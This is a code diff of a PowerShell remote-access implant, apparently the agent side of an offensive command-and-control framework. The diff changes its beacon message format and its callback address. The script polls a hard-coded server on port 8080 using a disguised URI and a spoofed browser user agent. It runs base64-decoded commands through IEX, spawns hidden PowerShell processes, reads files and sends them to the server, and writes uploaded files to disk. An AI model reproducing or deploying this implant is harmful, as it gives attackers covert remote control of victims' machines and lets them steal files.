@@ -1,5 +1,5 @@
-$h0 = "192.168"
-$me = ".0.90"
+$h0 = "172.16"
+$me = ".71.1"
 $p0rt= "8080"
 $uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
 $proto = "ht"+"tp"+":/"+"/"
@@ -14,7 +14,7 @@ $sleepytime = 3000
 $jsObject = @{}
 
 $useragent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
-$checkin = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"hn`": `"$hn`"}"
+$checkin = "{`"p`":[ {`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"hn`": `"$hn`"} ] }"
 
 function ConvertTo-Hashtable {
   [CmdletBinding()]
@@ -53,20 +53,22 @@ function ConvertTo-Hashtable {
 
 while ($True) {
 	$serverMsg = (Invoke-WebRequest -Method Post -Uri $h0me -Body $checkin -UserAgent $useragent -UseBasicParsing).Content
-	$jsondata = "{" + $serverMsg.split("{")[1].split("`n")[0]
+	$jsondata = "{" + ($serverMsg.split("{")[1..99] -join "{").split("`n")[0]
 	$jsObject = $jsondata | ConvertFrom-Json | ConvertTo-Hashtable
 
-	if($jsObject['cmnd']) {
+
+	if($jsObject['p'][0]['cmnd']) {
 		$rettype = "retval" #Default
 		$binary = $false
+                $cmnd = $jsObject['p'][0]['cmnd']
 	
-		if($jsObject['cmnd'] -eq "quit") {
+		if($cmnd -eq "quit") {
 			exit
 		}
 
-		if($jsObject['cmnd'].split(" ")[0] -eq "spawn") {
+		if($cmnd.split(" ")[0] -eq "spawn") {
 			try {
-				$selfdata = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($jsObject['cmnd'].split(" ")[1]))
+				$selfdata = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cmnd.split(" ")[1]))
 				$selfdata = $selfdata.replace('"','"""')
 				Start-Process powershell -ArgumentList "-c $selfdata" -NoNewWindow
 				$retval = "[+] Spawn success..."
@@ -76,8 +78,8 @@ while ($True) {
 			}
 		}
 
-		elseif($jsObject['cmnd'].split(" ")[0] -eq "psh" -or $jsObject['cmnd'].split(" ")[0] -eq "cs" -or $jsObject['cmnd'].split(" ")[0] -eq "shc") {
-			$psdata = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($jsObject['cmnd'].split(" ")[1]))
+		elseif($cmnd.split(" ")[0] -eq "psh" -or $cmnd.split(" ")[0] -eq "cs" -or $cmnd.split(" ")[0] -eq "shc") {
+			$psdata = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cmnd.split(" ")[1]))
 			$retval = IEX $psdata -ErrorVariable err 2>&1
 			if($err) {
 				$retval = $retval + "`n[-] Errors returned:`n`n" + $err
@@ -85,8 +87,8 @@ while ($True) {
 			}
 		}
 		
-		elseif($jsObject['cmnd'].split(" ")[0] -eq "dl") {
-			$filepath = $jsObject['cmnd'].split(" ")[1..99] -join " "
+		elseif($cmnd.split(" ")[0] -eq "dl") {
+			$filepath = $cmnd.split(" ")[1..99] -join " "
 			if(Test-Path $filepath) {
 				$filepath = Resolve-Path $filepath
 				$retval = [System.IO.File]::ReadAllBytes($filepath)
@@ -98,10 +100,10 @@ while ($True) {
 			}
 		}
 
-		elseif($jsObject['cmnd'].split(" ")[0] -eq "up") {
+		elseif($cmnd.split(" ")[0] -eq "up") {
 			try {
-				$filepath = $jsObject['cmnd'].split(" ")[2..99] -join " "
-				$content = [Convert]::FromBase64String($jsObject['cmnd'].split(" ")[1])
+				$filepath = $cmnd.split(" ")[2..99] -join " "
+				$content = [Convert]::FromBase64String($cmnd.split(" ")[1])
 				[IO.File]::WriteAllBytes($filepath, $content)
 				$retval = "[*] File uploaded: $filepath"
 			}
@@ -111,7 +113,7 @@ while ($True) {
 		}
 
 		else {
-			$retval = IEX $jsObject['cmnd'] -ErrorVariable err 2>&1
+			$retval = IEX $cmnd -ErrorVariable err 2>&1
 			if($err) {
 				$retval = $retval + "`n[-] Errors returned:`n`n" + $err
 				$err = ""
@@ -129,7 +131,9 @@ while ($True) {
 			$ncoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($retval | Out-String)))
 		}
 		$jsObject.cmnd = ""
-		$resp = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"hn`": `"$hn`", `"$rettype`": `"$ncoded`"}"
+		$cmnd = ""
+
+		$resp = "{`"p`":[ {`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"hn`": `"$hn`", `"$rettype`": `"$ncoded`"} ] }"
 		$null = Invoke-WebRequest -Method Post -Uri $h0me -Body $resp -UserAgent $useragent -UseBasicParsing
 	}
 	Start-Sleep -Milliseconds $sleepytime
